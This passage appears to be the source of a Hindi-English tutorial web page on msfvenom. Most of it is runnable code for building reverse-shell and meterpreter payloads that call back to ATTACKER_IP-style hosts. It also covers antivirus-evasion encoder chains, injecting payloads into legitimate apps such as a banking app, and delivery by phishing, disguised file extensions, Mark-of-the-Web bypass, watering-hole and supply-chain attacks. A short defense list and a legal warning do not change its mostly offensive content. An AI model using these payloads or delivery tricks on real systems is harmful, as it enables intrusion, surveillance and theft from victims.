msfvenom -p php/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o $OUTPUT_DIR/meterpreter.php

# PowerShell:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f ps1 -o $OUTPUT_DIR/shell.ps1

# Web:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -o $OUTPUT_DIR/shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o $OUTPUT_DIR/shell.war

echo "[+] सभी पेलोड्स जनरेट हो गए: $OUTPUT_DIR/"
ls -la $OUTPUT_DIR/`}
      />

      <h2>Msfvenom vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Msfvenom</th>
              <th className="text-left py-2 px-3 text-neon-green">Veil</th>
              <th className="text-left py-2 px-3 text-neon-green">Shellter</th>
              <th className="text-left py-2 px-3 text-neon-green">TheFatRat</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">प्लेटफ़ॉर्म</td><td className="py-2 px-3">Windows, Linux, Android, Mac</td><td className="py-2 px-3">Windows</td><td className="py-2 px-3">Windows</td><td className="py-2 px-3">Windows, Android</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">फॉर्मेट्स</td><td className="py-2 px-3">100+ (EXE, ELF, APK, PHP...)</td><td className="py-2 px-3">EXE, Python</td><td className="py-2 px-3">EXE</td><td className="py-2 px-3">EXE, APK</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">एन्कोडिंग</td><td className="py-2 px-3">बिल्ट-इन (shikata_ga_nai)</td><td className="py-2 px-3">Python/C ऑब्स्क्यूकेशन</td><td className="py-2 px-3">PE इंजेक्शन</td><td className="py-2 px-3">मल्टी-एन्कोडर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">AV बायपास</td><td className="py-2 px-3">बेसिक</td><td className="py-2 px-3">अच्छा</td><td className="py-2 px-3">बहुत अच्छा</td><td className="py-2 px-3">अच्छा</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Metasploit इंटीग्रेशन</td><td className="py-2 px-3">नेटिव</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">GUI</td><td className="py-2 px-3">नहीं (CLI only)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr><td className="py-2 px-3 text-white">उपयोग में आसानी</td><td className="py-2 px-3">आसान (CLI)</td><td className="py-2 px-3">आसान (CLI/GUI)</td><td className="py-2 px-3">मीडियम (GUI)</td><td className="py-2 px-3">आसान (GUI)</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'पेलोड काम नहीं कर रहा — कनेक्शन नहीं आ रहा', a: 'LHOST और LPORT चेक करो। फ़ायरवॉल/नेटवर्क चेक करो। Handler सही से सेटअप है? पेलोड और handler का payload एक ही होना चाहिए। NAT/VPN issues हो सकते हैं।' },
          { q: 'Windows Defender पेलोड डिलीट कर रहा है', a: 'एन्कोडिंग try करो (-e shikata_ga_nai -i 10)। Veil या Shellter use करो बेहतर AV bypass के लिए। कस्टम टेम्प्लेट try करो (-x flag)।' },
          { q: 'Android APK install नहीं हो रहा', a: 'Unknown sources enable करो। APK sign करो: apksigner sign --ks key.keystore payload.apk। ओरिजिनल APK में inject करो (-x flag)।' },
          { q: 'Encoder रैंडमली fail हो रहा है', a: 'बैड कैरेक्टर्स (-b) सेट करो। अलग encoder try करो। इटरेशंस (-i) कम करो। Space issues हो सकते हैं।' },
          { q: 'ELF payload Linux पर permission denied', a: 'chmod +x shell.elf करो। SELinux/AppArmor disable करो।' },
          { q: 'Meterpreter session तुरंत die हो रहा है', a: 'set AutoRunScript migrate करो। reverse_https try करो — TCP से ज़्यादा stable है।' },
          { q: 'Payload size बहुत बड़ा हो रहा है', a: '--smallest flag use करो। Stageless की जगह Staged use करो। अलग encoder try करो।' },
          { q: 'Handler से कनेक्शन नहीं आ रहा', a: 'LHOST और LPORT match check करो। Stageless payload है तो handler भी stageless होना चाहिए। Firewall outbound traffic allow है?' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Msfvenom पेलोड्स से कैसे बचें (डिफेंस पर्सपेक्टिव):
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">एंटीवायरस/EDR:</strong> अपडेटेड AV/EDR use करें — Defender, CrowdStrike, SentinelOne, Carbon Black</li>
        <li><strong className="text-white">एप्लिकेशन व्हाइटलिस्टिंग:</strong> सिर्फ approved apps चलने दें — AppLocker, WDAC</li>
        <li><strong className="text-white">नेटवर्क मॉनिटरिंग:</strong> आउटबाउंड कनेक्शंस monitor करें — अजीब पोर्ट्स पर reverse shells</li>
        <li><strong className="text-white">PowerShell Constrained Mode:</strong> PowerShell पेलोड्स ब्लॉक करें</li>
        <li><strong className="text-white">AMSI (Anti-Malware Scan Interface):</strong> PowerShell/VBScript स्कैनिंग</li>
        <li><strong className="text-white">यूज़र एजुकेशन:</strong> सोशल इंजीनियरिंग से बचना सिखाएं</li>
        <li><strong className="text-white">Macro Security:</strong> Office macros disable करें</li>
        <li><strong className="text-white">Email Gateway:</strong> मालिशियस अटैचमेंट्स ब्लॉक करें</li>
        <li><strong className="text-white">Sandbox Analysis:</strong> संदिग्ध फाइल्स को सैंडबॉक्स में चलाएं</li>
        <li><strong className="text-white">Behavioral Detection:</strong> Process injection, suspicious API calls detect करें</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        Msfvenom practice के लिए safe lab बनाओ:
      </p>
      <CodeBlock
        title="Lab Setup"
        code={`# VirtualBox/VMware में:
# 1. Kali Linux VM (attacker)
# 2. Windows 10 VM (target — Defender disable करो for practice)
# 3. Metasploitable2/3 VM (vulnerable target)
# 4. Android emulator (Genymotion/AVD)

# Network:
# Host-only adapter use करो — isolated network
# सभी VMs same subnet में हों

# Practice workflow:
# 1. Msfvenom से पेलोड जनरेट करो
# 2. Msfconsole में handler सेटअप करो
# 3. Payload को target VM पर transfer करो
# 4. Execute करो और session देखो
# 5. Meterpreter commands practice करो

# Metasploitable2 पर practice:
# - विभिन्न payloads try करो
# - AV bypass techniques test करो
# - Custom templates use करो`}
      />

      <h2>Advanced Techniques</h2>
      <CodeBlock
        title="Advanced Msfvenom"
        code={`# मल्टी-एन्कोडर चेन (AV evasion):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -e x86/alpha_mixed -i 3 -e x86/countdown -i 2 -f exe -o advanced.exe

# Pipe-based payload (no file — direct injection):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw | nc ATTACKER_IP 4444

# Staged vs Stageless:
# Staged (छोटा — stage डाउनलोड करता है):
msfvenom -p windows/x64/meterpreter/reverse_tcp ...
# Stageless (बड़ा — पूरा payload inline):
msfvenom -p windows/x64/meterpreter_reverse_tcp ...

# DLL Side-Loading (legitimate DLL replace):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o legit.dll

# MSI payload (Windows Installer):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o setup.msi

# Loopback payload (localhost पर कनेक्ट):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe -o loopback.exe

# Encoded PowerShell (AMSI bypass attempt):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -e x86/shikata_ga_nai -i 5 -f psh-cmd -o encoded_cmd.txt`}
      />

      <h2>Frequently Asked Questions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'Msfvenom और Metasploit में क्या फ़र्क है?', a: 'Msfvenom सिर्फ पेलोड जनरेट करता है। Metasploit (msfconsole) पूरा फ्रेमवर्क है — exploits, payloads, handlers, post-exploitation सब। Msfvenom Metasploit का ही हिस्सा है।' },
          { q: 'Staged और Stageless में क्या फ़र्क है?', a: 'Staged (reverse_tcp) — छोटा पेलोड जो handler से बड़ा stage डाउनलोड करता है। Stageless (meterpreter_reverse_tcp) — पूरा payload एक ही फाइल में। Stageless बड़ा होता है लेकिन बिना इंटरनेट भी काम करता है।' },
          { q: 'क्या Msfvenom फ्री है?', a: 'हाँ, Metasploit Framework ओपन सोर्स और फ्री है। Rapid7 Pro/Express पैड है लेकिन msfvenom दोनों में है।' },
          { q: 'AV bypass कैसे करें?', a: 'Basic: shikata_ga_nai मल्टी-इटरेशन। Better: Veil/Shellter/TheFatRat। Best: कस्टम C/C++ payload + manual obfuscation। EDR bypass बहुत मुश्किल है।' },
          { q: 'Handler क्यों ज़रूरी है?', a: 'Reverse shell payload बनाने पर टार्गेट आपकी मशीन पर कनेक्शन भेजता है। Handler उस कनेक्शन को accept करता है और session बनाता है। बिना handler के कनेक्शन गिर जाएगा।' },
          { q: 'Linux/Android पर काम करता है?', a: 'हाँ! ELF (Linux), APK (Android), Mach-O (macOS) — सब support। --platform और --arch से specify करो।' },
          { q: 'सबसे stealthy payload कौन सा है?', a: 'reverse_https या reverse_http — यह normal HTTPS/HTTP traffic जैसा दिखता है। Shellter या Veil से encode करो और legitimate EXE में inject करो।' },
          { q: 'Meterpreter vs Shell — कौन सा use करें?', a: 'Meterpreter ज़्यादा powerful है — file upload/download, screenshot, keylog, hashdump, migrate सब कर सकता है। Shell सिर्फ command line access देता है। Meterpreter use करो ज़्यादातर cases में।' },
          { q: 'Payload size कैसे कम करें?', a: '--smallest flag use करो। Stageless की जगह Staged use करो (छोटा होता है)। अलग encoder try करो। NOP sled remove करो। कम iterations use करो।' },
          { q: 'Msvenom detect हो रहा है VirusTotal पर', a: 'Veil या Shellter से encode करो। कस्टम C payload लिखो और manually compile करो। Process injection techniques use करो। EDR solutions बहुत advanced हैं — basic encoding काम नहीं करेगी।' },
          { q: 'Multiple payloads एक साथ कैसे बनाएं?', a: 'Batch script use करो — for loop में different LPORT/LHOST set करो। Resource scripts (.rc) से msfconsole automate करो। Parallel execution के लिए background processes use करो।' },
          { q: 'Payload test कैसे करें बिना target के?', a: 'VirtualBox/VMware में target VM बनाओ। Metasploitable2/3 use करो vulnerable target के लिए। Host-only network पर isolated testing करो। अपने localhost पर भी test कर सकते हो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Real-World Case Studies</h2>
      <p>
        Msfvenom पेनेट्रेशन टेस्टिंग engagements में daily use होता है। Red team operations में सबसे पहला step payload generation ही होता है। एक real engagement में tester ने Msfvenom से reverse_https meterpreter payload generate किया, Veil से encode किया, और phishing email के through deliver किया। Windows Defender bypass हो गया और 5 minutes में meterpreter session मिल गया। यह demonstrate करता है कि social engineering + proper payload crafting कितना effective हो सकता है।
      </p>
      <p>
        एक और case में, red team ने Android meterpreter APK बनाया और legitimate banking app के wrapper में inject किया (-x flag use करके)। Target user ने app install कर ली क्योंकि वो original app जैसी दिखती थी। Session मिलने पर SMS read, call logs, contacts — सब access हो गया। यह mobile penetration testing में Msfvenom की power demonstrate करता है। लेकिन याद रखो — यह सब सिर्फ authorized testing में ही करना चाहिए।
      </p>
      <p>
        IoT testing में भी Msfvenom useful है। ARM और MIPS architectures के payloads generate करके embedded devices पर test किया जाता है। एक engagement में tester ने Linux ARM bind shell payload बनाया और vulnerable router firmware में inject किया। Router पर persistent access मिल गया। यह demonstrate करता है कि Msfvenom सिर्फ Windows/Linux desktop तक limited नहीं है — IoT, embedded systems, mobile — सब cover करता है।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        Msfvenom अकेले use नहीं होता — यह Metasploit ecosystem का हिस्सा है। Payload generate करने के बाद msfconsole में handler setup करना पड़ता है। लेकिन इसके अलावा भी कई tools के साथ integrate कर सकते हो।
      </p>
      <CodeBlock
        title="Msfvenom + Veil Integration"
        code={`# Veil Framework से AV bypass:
# Step 1: Veil install करो
sudo apt install veil
veil

# Step 2: Veil में Msfvenom payload select करो
# use 1 (Evasion)
# use msfvenom payload
# set LHOST, LPORT
# generate

# Step 3: Output Veil-encoded payload मिलेगा
# यह Python/C-based executable होगा जो basic AV bypass करता है

# Direct pipe integration:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw | \\
  python3 -c "import sys; buf=sys.stdin.buffer.read(); open('/tmp/payload.bin','wb').write(buf)"`}
      />
      <CodeBlock
        title="Msfvenom + Resource Scripts"
        code={`# Msfconsole resource script बनाओ:
# /tmp/handler.rc
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
set ExitOnSession false
exploit -j

# Resource script run करो:
msfconsole -q -r /tmp/handler.rc

# Automated workflow:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o /tmp/payload.exe
msfconsole -q -r /tmp/handler.rc &

# Msfvenom + Nmap integration:
nmap -sV target.com -oX scan.xml
# Msfconsole में:
# db_import scan.xml
# services -p 80
# फिर appropriate exploit select करो`}
      />

      <h2>Performance Tuning</h2>
      <p>
        Msfvenom को fast और efficient बनाने के लिए कुछ best practices हैं:
      </p>
      <CodeBlock
        title="Speed Optimization"
        code={`# Payload generation speed:
# Raw format fastest है — conversion overhead नहीं:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f raw > /dev/null

# EXE format slower है — PE wrapper बनाना पड़ता है:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o /dev/null

# Encoding iterations बढ़ाने से time बढ़ता है:
# -i 1 → ~1 sec
# -i 5 → ~3 sec
# -i 10 → ~8 sec
# -i 20 → ~20 sec

# Batch generation (parallel):
for port in 4443 4444 4445 4446; do
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=$port -f exe -o "payload_$port.exe" &
done
wait
echo "All payloads generated!"

# Disk I/O optimization:
# SSD पर output write fast होता है
# tmpfs/ramdisk use करो for fastest:
mkdir -p /tmp/ramdisk
mount -t tmpfs -o size=100M tmpfs /tmp/ramdisk
msfvenom ... -f exe -o /tmp/ramdisk/payload.exe`}
      />

      <h2>Reporting and Output Analysis</h2>
      <p>
        Msfvenom payloads generate करने के बाद documentation और analysis ज़रूरी है:
      </p>
      <CodeBlock
        title="Payload Documentation"
        code={`# Payload metadata log करो:
#!/bin/bash
# payload-logger.sh
PAYLOAD="windows/x64/meterpreter/reverse_tcp"
LHOST="192.168.1.100"
LPORT="4444"
FORMAT="exe"
DATE=$(date +%Y%m%d_%H%M%S)
OUTPUT="payload_\${DATE}.exe"

msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FORMAT -o $OUTPUT

# Log entry:
echo "Date: $DATE" >> payload_log.txt
echo "Payload: $PAYLOAD" >> payload_log.txt
echo "LHOST: $LHOST" >> payload_log.txt
echo "LPORT: $LPORT" >> payload_log.txt
echo "Output: $OUTPUT" >> payload_log.txt
echo "MD5: $(md5sum $OUTPUT | awk '{print $1}')" >> payload_log.txt
echo "SHA256: $(sha256sum $OUTPUT | awk '{print $1}')" >> payload_log.txt
echo "---" >> payload_log.txt

# Payload size analysis:
ls -lh $OUTPUT
file $OUTPUT
strings $OUTPUT | head -20

# Hash verification (integrity check):
md5sum $OUTPUT
sha256sum $OUTPUT

# VirusTotal upload (test AV detection):
# https://www.virustotal.com पर hash check करो`}
      />

      <h2>Alternatives</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">टूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">खासियत</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Veil</td><td className="py-2 px-3">AV bypass payload जनरेटर</td><td className="py-2 px-3">Python/C ऑब्स्क्यूकेशन, Metasploit इंटीग्रेशन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Shellter</td><td className="py-2 px-3">PE इंजेक्शन टूल</td><td className="py-2 px-3">Legitimate EXE में payload inject, बहुत अच्छा AV bypass</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">TheFatRat</td><td className="py-2 px-3">ऑल-इन-वन payload जनरेटर</td><td className="py-2 px-3">GUI, मल्टी-प्लेटफ़ॉर्म, Backdoored EXE/APK</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Cobalt Strike</td><td className="py-2 px-3">Commercial C2 framework</td><td className="py-2 px-3">Beacon payloads, malleable C2 profiles, EDR evasion</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Empire</td><td className="py-2 px-3">PowerShell/Python C2</td><td className="py-2 px-3">Stagers, PowerShell obfuscation, cross-platform</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Sliver</td><td className="py-2 px-3">Go-based C2 framework</td><td className="py-2 px-3">Cross-platform, mTLS, WireGuard</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">Donut</td><td className="py-2 px-3">.NET/PE shellcode generator</td><td className="py-2 px-3">EXE/DLL/Script to shellcode</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">Metasploit Pro</td><td className="py-2 px-3">Commercial Metasploit</td><td className="py-2 px-3">GUI, smart payloads, phishing campaigns</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Payload Delivery Methods</h2>
      <p>
        Payload generate करने के बाद उसे target तक पहुँचाना सबसे critical step है। Delivery method target environment पर depend करता है:
      </p>
      <CodeBlock
        title="Delivery Techniques"
        code={`# Method 1: Phishing Email Attachment
# Payload को ZIP में compress करो (AV bypass)
zip payload.zip payload.exe
# Email attachment के रूप में भेजो
# Social engineering pretext जरूरी है

# Method 2: USB Drop Attack
# USB drive पर payload.exe + autorun.inf
# या HID attack (Rubber Ducky/BadUSB)
# Office reception area में drop करो

# Method 3: Web Server Upload
# PHP/JSP/ASP payload web server पर upload करो
# File upload vulnerability exploit करो
# /uploads/shell.php path access करो

# Method 4: Network Share
# SMB share पर payload.exe copy करो
# मैप्ड drives पर replace करो
# Group Policy से deploy करो (insider threat)

# Method 5: Watering Hole Attack
# Legitimate website compromise करो
# Browser exploit kit serve करो
# Visitors automatically infected

# Method 6: QR Code
# Payload URL को QR code में encode करो
# Physical locations पर stickers लगाओ
# Mobile devices redirect होंगे`}
      />
      <CodeBlock
        title="Evasion Delivery Tips"
        code={`# EXE to ISO conversion (Mark of the Web bypass):
# Windows 11 पर ISO files MOTW bypass करते हैं
# payload.exe को ISO में pack करो
# Email attachment के रूप में .iso भेजो

# HTA payload (HTML Application):
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f hta-psh -o shell.hta
# Web server पर host करो — browser में open होगा

# Macro-enabled documents:
# msfvenom -p windows/meterpreter/reverse_tcp ... -f vba
# Word/Excel document में macro embed करो
# User को macros enable करने के लिए social engineering

# LNK shortcut files:
# Windows shortcut (.lnk) में payload command embed करो
# Network share पर place करो — click होने पर execute`}
      />

      <div className="info-box mt-6">
        <strong>💡 Pro Tips:</strong>
        <ul className="list-disc list-inside text-gray-300 mt-2 space-y-1">
          <li>reverse_https या reverse_http use करो — TCP से stealthy है</li>
          <li>Veil/Shellter से encode करो AV bypass के लिए</li>
          <li>हमेशा handler पहले start करो, फिर payload deliver करो</li>
          <li>Staged payloads छोटे होते हैं — delivery आसान</li>
          <li>Custom EXE templates (-x) से detection कम होता है</li>
          <li>--smallest flag से minimum size payload मिलता है</li>
          <li>मल्टी-एन्कोडर chain से basic AV bypass हो सकता है</li>
          <li>कभी भी production environment में बिना अनुमति के पेलोड मत चलाओ</li>
          <li>Payload generate करने से पहले target architecture confirm करो (x86 vs x64)</li>
          <li>HTTPS payloads firewall inspection से बचते हैं — encrypted traffic</li>
          <li>Resource scripts (.rc) से repetitive tasks automate करो</li>
          <li>Payload size monitor करो — बड़े payloads suspicious लगते हैं</li>
          <li>Different LPORT try करो — 443, 53, 80 (common ports) less suspicious हैं</li>
          <li>Payload testing हमेशा isolated lab में करो — production में कभी नहीं</li>
          <li>Pentest report में payload details document करो — hash, size, delivery method</li>
        </ul>
      </div>

      <h2>Common Mistakes</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'गलत payload format select करना', a: 'Target OS के हिसाब से format चुनो। Windows: exe/dll/msi, Linux: elf, Android: apk, Web: asp/jsp/php।' },
          { q: 'Payload size बहुत बड़ा है', a: 'Encoder यूज़ करो — shikata_ga_nai सबसे popular है। -i flag से iterations बढ़ाओ। Staged payloads try करो।' },
          { q: 'Listener configure नहीं किया', a: 'Payload generate करने के बाद handler configure करो। LHOST, LPORT, payload type match होना चाहिए।' },
          { q: 'Antivirus detect कर रहा है', a: 'Custom encoders यूज़ करो। Payload inject करो legitimate files में। AMSI bypass techniques सीखो।' },
          { q: 'Connection establish नहीं हो रहा', a: 'Firewall/NAT issues check करो। Reverse shell के लिए LHOST publicly accessible होना चाहिए। Port forwarding setup करो।' },
          { q: 'Meterpreter session unstable', a: 'Staged payloads try करो। Network latency check करो। migrate command से stable process में migrate करो।' },
          { q: 'Payload generate नहीं हो रहा', a: 'Msfvenom syntax check करो। Payload name correct है verify करो। msfvenom -l payloads से available payloads देखो।' },
          { q: 'Encoded payload काम नहीं कर रहा', a: 'Encoding से payload corrupt हो सकता है। -b flag से bad characters specify करो। Different encoder try करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">❌ {item.q}</h4>
            <p className="text-gray-400 text-sm">✅ {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Payload Delivery Methods</h2>
      <p>
        Payload deliver करने के different methods — target environment के हिसाब से choose करो।
      </p>
      <CodeBlock
        title="पेलोड डिलीवरी"
        code={`# 1. Email Attachment:
# - exe rename करो (invoice.pdf.exe → invoice.pdf)
# - zip में compress करो
# - Macro-enabled documents (.docm)
# - HTA files (.hta)

# 2. USB Drop:
# - LNK files (shortcut) बनाओ
# - Rubber Ducky scripts
# - HID attacks (USB Rubber Ducky)

# 3. Web Delivery:
# - Apache/Nginx पर host करो
# - Social engineering से link share करो
# - Watering hole attacks

# 4. Network Delivery:
# - SMB shares पर place करो
# - MITM attacks (ARP spoofing)
# - Evil twin WiFi

# 5. Physical Access:
# - USB boot drive
# - Live CD/DVD
# - Direct terminal access

# 6. Supply Chain:
# - Legitimate software modify करो
# - Update mechanism exploit करो
# - Third-party library inject करो

# Delivery Tips:
# - Common ports use करो (80, 443, 53)
# - SSL/TLS encrypt करो traffic
# - Domain fronting techniques सीखो
# - CDN use करो payload host करने के लिए
# - URL shortener use करो (bit.ly, tinyurl)`}
      />

      <h2>Payload Types Comparison</h2>
      <p>
        Different payload types — कौन सा कब use करना है।
      </p>
      <CodeBlock
        title="पेलोड टाइप्स"
        code={`# Staged vs Stageless Payloads:

# Staged (meterpreter/reverse_tcp):
# - Small initial payload
# - Second stage download करता है
# - Firewall bypass में useful
# - Connection stable होने पर reliable
# - Size: ~100-200 bytes

# Stageless (meterpreter_reverse_tcp):
# - Complete payload single file में
# - No second stage download
# - Offline environments में useful
# - Size: ~700KB-1MB

# Inline vs Staged:
# Inline: पूरा payload single stage में
# Staged: Initial + second stage

# Bind vs Reverse:
# Bind: Target पर listener open होता है
# Reverse: Target attacker को connect करता है

# Meterpreter vs Shell:
# Meterpreter: Feature-rich, in-memory
# Shell: Basic command shell, lightweight

# When to use what:
# - Firewall behind target → Reverse shell
# - NAT behind attacker → Bind shell
# - Stealth needed → Staged + encoding
# - Speed needed → Stageless
# - Limited bandwidth → Staged
# - Full control → Meterpreter
# - Basic access → Shell`}
      />

      <h2>Real-World Scenarios</h2>
      <div className="space-y-3 mt-4">
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 1: Windows Exploitation</h4>
          <p className="text-gray-400 text-sm">
            EternalBlue (MS17-010) exploit के लिए payload generate करो। msfvenom से windows/meterpreter/reverse_tcp payload बनाओ। EXE format में generate करो और Metasploit handler configure करो। Target system पर deliver करो और meterpreter session establish करो।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 2: Android Penetration Testing</h4>
          <p className="text-gray-400 text-sm">
            Android APK payload generate करो। Original APK में payload inject करो (apktool से)। Legitimate app की तरह distribute करो। Meterpreter session से camera, microphone, SMS access करो।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 3: Web Application Testing</h4>
          <p className="text-gray-400 text-sm">
            PHP/ASP/JSP web shells generate करो। File upload vulnerability exploit करो। Web server पर payload upload करो। Meterpreter session establish करो और database access करो।
          </p>
        </div>
        <div className="glass-card p-4">
          <h4 className="text-white font-mono font-semibold mb-2">सिनेरियो 4: Social Engineering</h4>
          <p className="text-gray-400 text-sm">
            HTA payload generate करो। Phishing email से deliver करो। User click करने पर payload execute होता है। Meterpreter session establish होता है। SET + Msfvenom combo use करो।
          </p>
        </div>
      </div>

      <h2>Integration with Other Tools</h2>
      <p>
        Msfvenom को दूसरे tools के साथ integrate करके powerful attack workflows बनाओ।
      </p>
      <CodeBlock
        title="टूल इंटीग्रेशन"
        code={`# Metasploit + Msfvenom:
# Payload generate करो:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe

# Handler configure करो:
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; run"

# Nmap + Msfvenom:
# Nmap से vulnerable services find करो:
nmap -sV --script vuln target_ip
# Msfvenom से payload generate करो:
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > exploit.exe

# SET + Msfvenom:
# SET में custom payload use करो:
setoolkit → Social-Engineering Attacks → Website Attack Vectors → Credential Harvester

# Veil + Msfvenom:
# Veil से undetectable payload:
veil → Evasion → Go → meterpreter/rev_tcp.py

# Cobalt Strike + Msfvenom:
# Cobalt Strike में custom payload import करो

# Custom Scripts:
#!/bin/bash
# Auto-generate payloads for different targets:
for platform in windows linux android; do
    msfvenom -p \${platform}/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > \${platform}_shell.exe
done`}
      />

      <div className="info-box mt-6">
        <strong>💡 अगला कदम:</strong> Msfvenom से payload generation सीखने के बाद{' '}
        <Link to="/tool/metasploit-framework" className="text-neon-green underline">Metasploit</Link> सेक्शन में जाएं
        और exploitation techniques सीखें! Msfvenom से बनाए payloads का इस्तेमाल Metasploit में करो।
      </div>

      <div className="warning-box mt-6">
        <strong>⚠️ फाइनल वार्निंग:</strong> Msfvenom एक शक्तिशाली पेलोड जनरेटर है। इसका इस्तेमाल केवल अधिकृत पेनेट्रेशन टेस्टिंग और शैक्षिक उद्देश्यों के लिए करें। दुर्भावनापूर्ण पेलोड बनाना, वितरित करना, या चलाना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत इसमें 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल अपने लैब या लिखित अनुमति के साथ ही उपयोग करें।
      </div>
    </TutorialLayout>
  )
}
